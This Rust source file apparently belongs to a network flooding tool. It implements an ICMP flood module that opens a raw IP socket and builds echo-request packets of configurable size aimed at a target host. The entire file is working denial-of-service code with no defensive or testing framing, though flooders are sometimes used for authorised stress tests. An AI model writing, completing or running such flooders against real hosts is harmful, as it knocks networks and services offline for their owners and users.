use std::net::Ipv4Addr;
use std::sync::{Arc, Mutex};

use anyhow::Result;
use pnet::packet::icmp::echo_request::MutableEchoRequestPacket;
use pnet::packet::icmp::IcmpTypes;
use pnet::packet::ip::IpNextHeaderProtocols;
use pnet::packet::ipv4::MutableIpv4Packet;
use pnet::packet::MutablePacket;
use pnet::transport::TransportChannelType::Layer3;
use pnet::transport::{transport_channel, TransportSender};
use pnet::util;

use crate::cli::IcmpArgs;

use super::{create_ipv4_packet, Flooder};

pub struct IcmpFlooder {
  tx: Arc<Mutex<TransportSender>>,
  delay: u64,
  args: IcmpArgs,
}

impl IcmpFlooder {
  pub fn init(args: IcmpArgs, delay: u64) -> Result<Self> {
    println!("ICMP flood");
    println!("Payloading {}-byte packets", args.size);

    let (tx, _) = transport_channel(2 << 15, Layer3(IpNextHeaderProtocols::Icmp)).unwrap();
    Ok(Self {
      tx: Arc::new(Mutex::new(tx)),
      delay,
      args,
    })
  }
}

impl Flooder for IcmpFlooder {
  type Args = IcmpArgs;
  const PROTO_HEADER_LEN: usize = 8;

  fn clone(&self) -> (Arc<Mutex<TransportSender>>, Ipv4Addr, usize, Self::Args, u64) {
    (
      self.tx.clone(),
      self.args.host,
      self.args.size,
      self.args.clone(),
      self.delay,
    )
  }

  fn create_packet<'a>(buffer_ip: &'a mut [u8], buffer_icmp: &'a mut [u8], args: Self::Args) -> MutableIpv4Packet<'a> {
    let mut ipv4_packet = create_ipv4_packet(buffer_ip, args.host, IpNextHeaderProtocols::Icmp, buffer_icmp.len());

    let mut icmp_packet = MutableEchoRequestPacket::new(buffer_icmp).expect("Error creating icmp packet");
    icmp_packet.set_icmp_type(IcmpTypes::EchoRequest);
    let checksum = util::checksum(icmp_packet.packet_mut(), 1);
    icmp_packet.set_checksum(checksum);

    ipv4_packet.set_payload(icmp_packet.packet_mut());
    ipv4_packet
  }
}
